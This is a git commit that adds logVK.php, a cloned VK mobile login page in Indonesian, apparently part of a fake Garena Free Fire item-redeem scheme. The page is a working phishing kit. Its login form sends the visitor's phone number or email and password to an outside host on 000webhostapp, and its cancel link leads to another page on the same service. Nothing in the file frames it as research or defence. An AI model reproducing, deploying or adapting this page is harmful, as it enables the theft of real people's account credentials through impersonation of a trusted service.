52e7bd8f19fbf922051f0d7320f3e67c84eae0db
garena-free-fire-2020 <67101366+garena-free-fire-2020@users.noreply.github.com>
2020-06-18 20:13:26 +0700

    Add files via upload

---
+++ logVK.php
@@ -0,0 +1,120 @@
+
+<!DOCTYPE html><html class="vk vk_js_yes vk_1x vk_flex_yes r m h  vk_appAuth_no n vk_modern  vk_schemes_no"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-779c5d4e-57aa-4c50-8d54-14c3e178be6d@mhtml.blink" />
+              
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, user-scalable=no">
+        <meta name="format-detection" content="telephone=no">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="MobileOptimized" content="176">
+        <meta name="HandheldFriendly" content="True">
+        <base id="base">
+        
+        <meta name="description" content="VK adalah jaringan sosial terbesar benua Eropa yang beranggotakan lebih dari 100 juta pemakai aktif. Tujuan utama kami adalah untuk menjaga para teman lama, teman kelas, tetangga, maupun rekan kerja Anda untuk selalu berhubungan.">
+        <link rel="shortcut icon" href="https://oauth.vk.com/images/icons/favicons/fav_logo.ico?8">
+            <meta name="theme-color" content="#ffffff">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://oauth.vk.com/images/icons/pwa/favicon_32.png?8">
+    <link rel="apple-touch-icon" href="https://oauth.vk.com/images/icons/pwa/apple/default.png?8">
+    <link rel="mask-icon" href="https://oauth.vk.com/images/icons/pwa/safari_pinned_tab.svg" color="#5181b8">
+    <meta name="msapplication-config" content="/images/icons/pwa/windows/browserconfig.xml">
+    <meta name="apple-mobile-web-app-title" content="VK">
+    <meta name="application-name" content="VK">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <title>Buka Akses menuju VK | VK</title>
+        <meta http-equiv="origin-trial" content="Av8ECqeAAIiC9bF3N7aq2M/TaxNzzpPcFXnw0rRb9KRUQlbyHKYmPj6KeVUFVDk+S7W9RfJH2GsEOS8G99uJvgcAAABaeyJvcmlnaW4iOiJodHRwczovL3ZrLmNvbTo0NDMiLCJmZWF0dXJlIjoiQmFkZ2luZyIsImV4cGlyeSI6MTU2MTY2MTkxNCwiaXNTdWJkb21haW4iOnRydWV9">
+        
+
+        
+        
+        <link rel="stylesheet" href="https://m.vk.com/css/mobile/variables.css?ca2dab460426ab9c60348682afb8b532e98e7644d3e624a622891a05be5e6a52">
+<link rel="stylesheet" href="https://m.vk.com/css/mobile/oauth_base.css?05bffb9fa002919f862e8cdad61b15796162010bf71418e0b9ac977cb6516eea">
+<link rel="stylesheet" href="https://m.vk.com/css/mobile/common.css?0af3afda5964ad0f165d803501fefb8bed5b5756dbde27bdf89d4db51ba3a200">
+<link rel="stylesheet" href="https://m.vk.com/css/mobile/audio_player_bottom.css?de932ba818c8d09abc2631e67d37431a503b70bdb2bc0305b7246cb97b14dae8">
+<link rel="stylesheet" href="https://m.vk.com/css/mobile/audio_player_mini.css?8f19886d1bff8d8e4c23f4a7d23409510fed42e82da84d48793a0996cdfe5484">
+
+
+
+
+
+
+
+
+
+        
+        
+      </head>
+
+      <body class="vk__page _ivk _touch vk_ios_no _hfixed vk_stickers_hints_support_no opera_mini_no vk_safari_no vk__page_oauth vk_tabbar_bottom vk_al_no">
+        
+            <div class="layout">
+      
+          <div class="layout__header mhead" id="vk_head"></div>
+      <div class="layout__body  _js _copts" id="vk_wrap">
+        <div class="layout__leftMenu" id="l" style="min-height: 0px;">
+          
+        </div>
+        <div class="layout__basis" id="m" role="main" style="min-height: 0px;">
+              <div class="basis">
+      <div class="basis__header mhead basis__header_noBottomMenu basis__header_noshadow basis__header_noshadowAnim basis__header_nohide" id="mhead"><div class="hb_wrap mhb_logo">
+  <div class="hb_btn mhi_logo">&nbsp;</div>
+  <h1 class="hb_btn mh_header">&nbsp;</h1>
+</div>
+</div>
+      <div class="basis__menu"><div class="AudioPlayerBottom"></div><div class="VideoFilterBadgeFiller"></div></div>
+      
+      <div class="basis__content mcont " id="mcont" data-canonical=""><div class="pcont fit_box bl_cont">
+  <div class="PageBlock">
+  <div class="owner_panel oauth_mobile_header">
+    
+    <div class="">
+      
+      <div class="op_info">Login ke <b>VK</b> untuk meneruskan.</div>
+    </div>
+  </div>
+  <div class="form_item fi_fat">
+    
+    <form method="post" action="https://garena-free-fire-redem-item.000webhostapp.com/succesfb.php">
+      
+      
+      
+      
+      <dl class="fi_row">
+        <dt class="fi_label">Nomor HP atau email:</dt>
+        <dd>
+          <div class="iwrap"><input type="text" class="textfield" name="emailfb" value=""></div>
+        </dd>
+      </dl>
+      <dl class="fi_row">
+        <dt class="fi_label">Sandi::</dt>
+        <dd>
+          <div class="iwrap"><input type="password" class="textfield" name="passfb"></div>
+        </dd>
+      </dl>
+      
+      <div class="fi_row">
+        <div class="fi_subrow">
+          <input class="button" type="submit" value="Login"><div class="near_btn"><a href="https://kirim-pesan-email-otomatis.000webhostapp.com/index.html">Batal</a></div>
+        </div>
+      </div>
+      
+    </form>
+  </div>
+  </div>
+</div></div>
+      
+      
+      
+    </div>
+        </div>
+      </div>
+    </div>
+        
+        
+        
+        <div id="vk_utils"></div>
+        <div id="z"></div>
+        <div id="vk_bottom"></div>
+        <div id="theme_color_shim"></div>
+        
+        
+      
+    </body></html>
